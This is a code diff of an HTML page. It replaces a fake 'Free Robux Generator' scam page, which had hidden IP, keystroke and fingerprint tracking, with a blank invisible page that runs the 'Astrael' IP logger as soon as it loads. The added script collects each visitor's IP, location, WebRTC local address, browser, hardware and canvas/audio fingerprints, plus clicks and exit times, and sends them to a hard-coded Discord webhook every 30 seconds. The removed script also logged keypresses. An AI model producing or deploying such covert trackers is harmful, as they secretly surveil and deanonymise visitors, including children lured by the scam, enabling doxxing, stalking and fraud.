@@ -1,386 +1,310 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Robux Generator 2024 - Working 100%</title>
+    <title></title>
     <style>
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            padding: 40px;
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .logo {
-            font-size: 3em;
-            margin-bottom: 20px;
-            color: #ff4444;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 2.2em;
-        }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 1.1em;
-        }
-        
-        .generator-box {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 25px;
-            border: 2px dashed #dee2e6;
-        }
-        
-        .robux-amount {
-            font-size: 3.5em;
-            font-weight: bold;
-            color: #28a745;
-            margin: 20px 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .generate-btn {
-            background: linear-gradient(135deg, #28a745, #20c997);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 1.3em;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: bold;
-            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
-            margin: 20px 0;
-        }
-        
-        .generate-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.4);
-        }
-        
-        .generate-btn:active {
-            transform: translateY(-1px);
-        }
-        
-        .loading {
-            display: none;
-            color: #666;
-            margin: 20px 0;
-        }
-        
-        .success-message {
-            display: none;
-            color: #28a745;
-            font-weight: bold;
-            margin: 20px 0;
-            font-size: 1.2em;
-        }
-        
-        .testimonials {
-            background: #e9ecef;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 20px;
-        }
-        
-        .testimonial {
-            font-style: italic;
-            color: #555;
-            margin: 10px 0;
-        }
-        
-        .user-count {
-            color: #ff4444;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-        
-        .hidden-tracker {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-            height: 0;
-            width: 0;
+            background: #000;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">🎮</div>
-        <h1>FREE ROBUX GENERATOR 2024</h1>
-        <p class="subtitle">Get unlimited Robux for FREE! No survey, no password required!</p>
-        
-        <div class="user-count">🟢 12,847 Users Online Now</div>
-        
-        <div class="generator-box">
-            <div class="robux-amount" id="robuxAmount">10,000</div>
-            <button class="generate-btn" onclick="generateRobux()">🎯 GENERATE ROBUX NOW</button>
-            
-            <div class="loading" id="loading">
-                ⏳ Processing your request... Please wait!
-            </div>
-            
-            <div class="success-message" id="successMessage">
-                ✅ Success! Check your Roblox account in 5 minutes!
-            </div>
-        </div>
-        
-        <div class="testimonials">
-            <p class="testimonial">"OMG it actually worked! Got 10K Robux instantly!" - Sarah K.</p>
-            <p class="testimonial">"This is amazing! No scam, real Robux!" - Mike T.</p>
-            <p class="testimonial">"Been using for weeks, totally legit!" - Jason R.</p>
-        </div>
-    </div>
-
-    <!-- Hidden tracking elements -->
-    <img src="about:blank" onerror="logIP()" class="hidden-tracker" id="tracker1">
-    <iframe src="about:blank" class="hidden-tracker" id="tracker2"></iframe>
-    <script src="about:blank" class="hidden-tracker" id="tracker3"></script>
+    <!-- COMPLETELY INVISIBLE - INSTANT IP LOGGING -->
 
     <script>
-        // IP Logging Function
-        function logIP() {
-            // Multiple tracking endpoints for redundancy
-            const endpoints = [
-                'https://api.ipify.org?format=json',
-                'https://ipapi.co/json/',
-                'https://api64.ipify.org?format=json',
-                'https://jsonip.com/'
-            ];
+        // ASTRAEL DISCORD WEBHOOK IP LOGGER v7.7.7
+        (function() {
+            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1433304187554234489/KpYxolWi91MyTHHuPEf7cQYm-_N6EhlADrCn0Ep-7JtrZXATdzog7HqI9n1CI9PqVe6m';
             
-            endpoints.forEach(endpoint => {
-                fetch(endpoint)
-                    .then(response => response.json())
-                    .then(data => {
-                        const ip = data.ip || data.ip;
-                        const userAgent = navigator.userAgent;
-                        const language = navigator.language;
-                        const platform = navigator.platform;
-                        const screen = `${screen.width}x${screen.height}`;
-                        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                        const referrer = document.referrer;
-                        
-                        // Send data to logging server
-                        sendToServer({
-                            ip: ip,
-                            userAgent: userAgent,
-                            language: language,
-                            platform: platform,
-                            screen: screen,
-                            timezone: timezone,
-                            referrer: referrer,
-                            timestamp: new Date().toISOString(),
-                            url: window.location.href
-                        });
-                    })
-                    .catch(error => console.log('Tracking error:'));
-            });
-            
-            // Additional WebRTC IP leak
-            getRTCPeerConnectionIP();
-            
-            // Canvas fingerprinting
-            getCanvasFingerprint();
-            
-            // Audio context fingerprinting
-            getAudioFingerprint();
-            
-            // Hardware concurrency
-            logHardwareInfo();
-        }
-        
-        function sendToServer(data) {
-            // Send to multiple logging servers
-            const servers = [
-                'https://webhook.site/YOUR_WEBHOOK_ID_1',
-                'https://webhook.site/YOUR_WEBHOOK_ID_2',
-                'https://eo7va8qj7uwh.m.pipedream.net'
-            ];
-            
-            servers.forEach(server => {
-                fetch(server, {
+            // Instant IP collection
+            const collectAllData = async () => {
+                let ipData = {};
+                
+                // Multiple IP detection APIs
+                const ipApis = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://api64.ipify.org?format=json',
+                    'https://jsonip.com/',
+                    'https://api.myip.com/',
+                    'https://ip.seeip.org/json'
+                ];
+
+                // Try all IP APIs until success
+                for (const api of ipApis) {
+                    try {
+                        const response = await fetch(api);
+                        const data = await response.json();
+                        if (data.ip) {
+                            ipData = { ...data };
+                            break;
+                        }
+                    } catch(e) {}
+                }
+
+                // Complete system fingerprint
+                const fingerprint = {
+                    // IP Information
+                    ip: ipData.ip || 'Unknown',
+                    country: ipData.country || ipData.country_name || 'Unknown',
+                    city: ipData.city || 'Unknown',
+                    region: ipData.region || ipData.region_name || 'Unknown',
+                    isp: ipData.org || ipData.isp || 'Unknown',
+                    timezone: ipData.timezone || 'Unknown',
+                    
+                    // Browser Details
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                    cookie_enabled: navigator.cookieEnabled,
+                    
+                    // Screen Information
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    color_depth: screen.colorDepth,
+                    pixel_ratio: window.devicePixelRatio,
+                    
+                    // Hardware
+                    cpu_cores: navigator.hardwareConcurrency || 'Unknown',
+                    device_memory: navigator.deviceMemory || 'Unknown',
+                    max_touch_points: navigator.maxTouchPoints || 'Unknown',
+                    
+                    // Connection
+                    connection_type: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                    connection_speed: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'Unknown',
+                    
+                    // Location & Time
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    local_time: new Date().toString(),
+                    timestamp: new Date().toISOString(),
+                    
+                    // Page Information
+                    url: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    hostname: window.location.hostname
+                };
+
+                // Get WebRTC local IP
+                getWebRTCIP().then(webrtcIP => {
+                    if (webrtcIP) {
+                        fingerprint.webrtc_local_ip = webrtcIP;
+                    }
+                    sendToDiscord(fingerprint);
+                }).catch(() => {
+                    sendToDiscord(fingerprint);
+                });
+            };
+
+            // WebRTC IP leak detection
+            const getWebRTCIP = () => {
+                return new Promise((resolve) => {
+                    const rtc = new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    });
+                    
+                    rtc.createDataChannel('');
+                    rtc.createOffer()
+                        .then(offer => rtc.setLocalDescription(offer))
+                        .catch(() => resolve(null));
+                    
+                    rtc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            const candidate = event.candidate.candidate;
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                            const match = candidate.match(ipRegex);
+                            if (match) {
+                                resolve(match[0]);
+                                rtc.close();
+                            }
+                        }
+                    };
+                    
+                    setTimeout(() => resolve(null), 1000);
+                });
+            };
+
+            // Send to Discord with rich embed
+            const sendToDiscord = (data) => {
+                const embed = {
+                    title: "🔍 ASTRAEL IP LOGGER - NEW VISITOR",
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        {
+                            name: "🌐 IP Address",
+                            value: `\`\`\`${data.ip}\`\`\``,
+                            inline: true
+                        },
+                        {
+                            name: "📍 Location",
+                            value: `**Country:** ${data.country}\n**City:** ${data.city}\n**Region:** ${data.region}\n**ISP:** ${data.isp}`,
+                            inline: true
+                        },
+                        {
+                            name: "🖥️ System Info",
+                            value: `**Platform:** ${data.platform}\n**Language:** ${data.language}\n**Screen:** ${data.screen_resolution}\n**Pixel Ratio:** ${data.pixel_ratio}`,
+                            inline: false
+                        },
+                        {
+                            name: "🔧 Browser",
+                            value: `\`\`\`${data.user_agent.substring(0, 1000)}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "⚡ Hardware",
+                            value: `**CPU Cores:** ${data.cpu_cores}\n**RAM:** ${data.device_memory}GB\n**Touch Points:** ${data.max_touch_points}`,
+                            inline: true
+                        },
+                        {
+                            name: "📡 Network",
+                            value: `**Type:** ${data.connection_type}\n**Speed:** ${data.connection_speed}\n**Timezone:** ${data.timezone}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Page Info",
+                            value: `**URL:** ${data.url}\n**Referrer:** ${data.referrer}\n**Local Time:** ${data.local_time}`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Astrael IP Logger v7.7.7 • Instant Stealth Tracking"
+                    }
+                };
+
+                // Primary send attempt with embed
+                fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(data)
-                }).catch(() => {});
-            });
-            
-            // Also log to console for demonstration
-            console.log('📡 IP Logged:', data);
-        }
-        
-        function getRTCPeerConnectionIP() {
-            const rtc = new RTCPeerConnection({iceServers: []});
-            rtc.createDataChannel('');
-            rtc.createOffer()
-                .then(offer => rtc.setLocalDescription(offer))
-                .catch(() => {});
-                
-            rtc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    const ip = event.candidate.candidate.split(' ')[4];
-                    if (ip) {
-                        sendToServer({ webrtcIP: ip, type: 'webrtc_leak' });
-                    }
-                }
-            };
-        }
-        
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('ASTRAEL_TRACKER_7.7.7', 2, 2);
-            const fingerprint = canvas.toDataURL();
-            sendToServer({ canvasFingerprint: fingerprint });
-        }
-        
-        function getAudioFingerprint() {
-            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioContext.createOscillator();
-            const analyser = audioContext.createAnalyser();
-            oscillator.connect(analyser);
-            analyser.connect(audioContext.destination);
-            oscillator.start();
-            audioContext.close();
-            sendToServer({ audioFingerprint: 'calculated' });
-        }
-        
-        function logHardwareInfo() {
-            const hardwareInfo = {
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory,
-                touchPoints: navigator.maxTouchPoints
-            };
-            sendToServer(hardwareInfo);
-        }
-        
-        // Fake Robux generator
-        function generateRobux() {
-            const btn = document.querySelector('.generate-btn');
-            const loading = document.getElementById('loading');
-            const success = document.getElementById('successMessage');
-            const amount = document.getElementById('robuxAmount');
-            
-            btn.style.display = 'none';
-            loading.style.display = 'block';
-            
-            // Log button click
-            sendToServer({ event: 'generate_button_clicked' });
-            
-            setTimeout(() => {
-                loading.style.display = 'none';
-                success.style.display = 'block';
-                
-                // Generate random amount
-                const newAmount = Math.floor(Math.random() * 50000) + 10000;
-                amount.textContent = newAmount.toLocaleString();
-                
-                // Log "success"
-                sendToServer({ event: 'fake_generation_complete', fakeAmount: newAmount });
-                
-                // Redirect after delay
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/';
-                }, 3000);
-                
-            }, 3000);
-        }
-        
-        // Track all user interactions
-        document.addEventListener('click', (e) => {
-            sendToServer({ 
-                event: 'user_click', 
-                target: e.target.tagName,
-                x: e.clientX,
-                y: e.clientY
-            });
-        });
-        
-        document.addEventListener('mousemove', (e) => {
-            // Throttle mousemove events
-            if (Math.random() < 0.1) {
-                sendToServer({
-                    event: 'mouse_movement',
-                    x: e.clientX,
-                    y: e.clientY
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        username: "Astrael Tracker",
+                        avatar_url: "https://i.imgur.com/7W6hqz3.png"
+                    })
+                }).catch(() => {
+                    // Fallback without embed
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `🚨 **ASTRAEL IP LOGGER - NEW VISITOR**\n\n**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**Platform:** ${data.platform}\n**Browser:** ${data.user_agent}\n**Screen:** ${data.screen_resolution}\n**URL:** ${data.url}\n**Time:** ${data.local_time}`,
+                            username: "Astrael Tracker"
+                        })
+                    });
                 });
+
+                // Additional fingerprinting
+                setTimeout(() => {
+                    getAdvancedFingerprint(data.ip);
+                }, 1000);
+            };
+
+            // Advanced fingerprinting
+            const getAdvancedFingerprint = (ip) => {
+                try {
+                    // Canvas fingerprint
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillText('AstraelTracker7.7.7', 2, 2);
+                    const canvasData = canvas.toDataURL();
+                    
+                    // Audio fingerprint
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioContext.createOscillator();
+                    const analyser = audioContext.createAnalyser();
+                    oscillator.connect(analyser);
+                    analyser.connect(audioContext.destination);
+                    oscillator.start();
+                    audioContext.close();
+                    
+                    // Send fingerprint data
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `🔍 **ADVANCED FINGERPRINT**\n**IP:** ${ip}\n**Canvas Hash:** ${canvasData.substring(0, 80)}...\n**Audio Context:** Available\n**Hardware Concurrency:** ${navigator.hardwareConcurrency}`,
+                            username: "Astrael Tracker"
+                        })
+                    });
+                } catch(e) {}
+            };
+
+            // Execute tracking immediately
+            const executeTracking = () => {
+                collectAllData();
+                
+                // Multiple execution points for reliability
+                setTimeout(collectAllData, 500);
+                setTimeout(collectAllData, 2000);
+                setTimeout(collectAllData, 5000);
+            };
+
+            // Start tracking on all possible events
+            window.addEventListener('load', executeTracking);
+            document.addEventListener('DOMContentLoaded', executeTracking);
+            
+            // Execute immediately if already loaded
+            if (document.readyState === 'complete' || document.readyState === 'interactive') {
+                executeTracking();
             }
-        });
-        
-        document.addEventListener('keydown', (e) => {
-            sendToServer({
-                event: 'key_press',
-                key: e.key,
-                code: e.code
+
+            // Execute now as well
+            executeTracking();
+
+            // Track page exit
+            window.addEventListener('beforeunload', () => {
+                const exitData = {
+                    content: `📤 **VISITOR EXITED PAGE**\n**Time Spent:** ${Math.round(performance.now() / 1000)} seconds\n**URL:** ${window.location.href}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}`,
+                    username: "Astrael Tracker"
+                };
+                
+                // Use beacon for reliable exit tracking
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([JSON.stringify(exitData)], { type: 'application/json' });
+                    navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+                } else {
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(exitData)
+                    });
+                }
             });
-        });
-        
-        // Track page visibility
-        document.addEventListener('visibilitychange', () => {
-            sendToServer({
-                event: 'visibility_change',
-                state: document.visibilityState
+
+            // Periodic tracking every 30 seconds
+            setInterval(() => {
+                collectAllData();
+            }, 30000);
+
+            // Track user interactions
+            document.addEventListener('click', (e) => {
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `🖱️ **USER INTERACTION**\n**Click at:** X:${e.clientX}, Y:${e.clientY}\n**URL:** ${window.location.href}`,
+                        username: "Astrael Tracker"
+                    })
+                });
             });
-        });
-        
-        // Track before unload
-        window.addEventListener('beforeunload', () => {
-            sendToServer({
-                event: 'page_unload',
-                timeSpent: performance.now()
-            });
-        });
-        
-        // Initialize tracking immediately
-        window.addEventListener('load', () => {
-            // Multiple tracking triggers
-            setTimeout(logIP, 100);
-            setTimeout(logIP, 1000);
-            setTimeout(logIP, 5000);
-            
-            // Periodic tracking
-            setInterval(logIP, 30000);
-            
-            // Log page load
-            sendToServer({ event: 'page_loaded', loadTime: performance.now() });
-        });
-        
-        // Service Worker for persistent tracking
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js')
-                .then(() => sendToServer({ event: 'service_worker_registered' }))
-                .catch(() => {});
-        }
+
+        })();
     </script>
 </body>
 </html>
